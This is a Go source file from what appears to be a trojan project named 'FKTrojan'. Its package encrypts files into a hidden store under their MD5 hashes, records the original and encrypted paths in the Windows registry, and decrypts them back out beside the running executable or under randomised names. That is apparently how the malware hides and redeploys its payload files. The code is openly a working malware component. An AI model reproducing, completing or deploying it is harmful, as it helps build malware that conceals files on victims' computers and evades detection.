package file_crypto

import (
	"FKTrojan/common"
	"FKTrojan/registry_crypto"
	"FKTrojan/stream_utils"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

var (
	key = ""
)

type FileInfo struct {
	DecryptPath string `json:"decrypt_path"`
	EncryptPath string `json:"encrypt_path"`
}

func RandomFile() string {
	for i := 0; i < 10; i++ {
		file := filepath.Join(getSavePath(), getExeName())
		if !common.PathExist(file) {
			return file
		}
	}
	f, err := ioutil.TempFile("", "")
	if err != nil {
		return ""
	}
	defer f.Close()
	return f.Name()
}
func FindFile(md5sum string) (*FileInfo, error) {
	b, err := registry_crypto.Get(registry_crypto.RegistryKeyType(md5sum))
	if err != nil {
		return nil, err
	}
	var f FileInfo
	err = json.Unmarshal([]byte(b), &f)
	if err != nil {
		return nil, err
	}
	err = f.Decrypt()
	if err != nil {
		return nil, err
	}
	return &f, nil
}
func (f *FileInfo) Encrypt() error {
	f.setEncryptFile()
	err := f.encryptFile()
	if err != nil {
		return err
	}
	return f.saveRegistry()
}
func (f *FileInfo) md5sum() string {
	return common.Md5HashStringFile(f.DecryptPath)
}
func (f *FileInfo) setEncryptFile() {
	md5sum := f.md5sum()
	f.EncryptPath = filepath.Join(getSavePath(), md5sum)
}
func (f *FileInfo) setDecryptFile() {
	ext := filepath.Ext(f.DecryptPath)
	f.DecryptPath = filepath.Join(getExePath(), getExeName()+ext)
}
func (f *FileInfo) saveRegistry() error {
	md5sum := f.md5sum()
	b, err := json.MarshalIndent(f, "", "  ")
	if err != nil {
		return err
	}
	return registry_crypto.Set(registry_crypto.RegistryKeyType(md5sum), string(b))
}

func (f *FileInfo) Decrypt() error {
	f.setDecryptFile()
	return f.decryptFile()
}

func (f *FileInfo) decryptFile() error {
	if !common.PathExist(f.EncryptPath) {
		return fmt.Errorf("source file not exist %s", f.DecryptPath)
	}
	fileStream, err := os.Open(f.EncryptPath)
	if err != nil {
		return err
	}
	defer fileStream.Close()
	DecryptDir := filepath.Dir(f.DecryptPath)
	err = os.MkdirAll(DecryptDir, 066)
	if err != nil {
		return err
	}
	cryptoStream, err := stream_utils.DecryptFromStream(fileStream, getIV(), getCFBK())
	if err != nil {
		return err
	}
	return stream_utils.StreamToFile(f.DecryptPath, cryptoStream, true)
}

func (f *FileInfo) encryptFile() error {
	if !common.PathExist(f.DecryptPath) {
		return fmt.Errorf("source file not exist %s", f.DecryptPath)
	}
	EncryptDir := filepath.Dir(f.EncryptPath)
	err := os.MkdirAll(EncryptDir, 066)
	if err != nil {
		return err
	}
	fileStream, err := os.OpenFile(f.EncryptPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return err
	}
	defer fileStream.Close()
	cryptoStream, err := stream_utils.EncryptToStream(fileStream, getIV(), getCFBK())
	if err != nil {
		return err
	}
	return stream_utils.FileToStream(f.DecryptPath, cryptoStream, true)
}
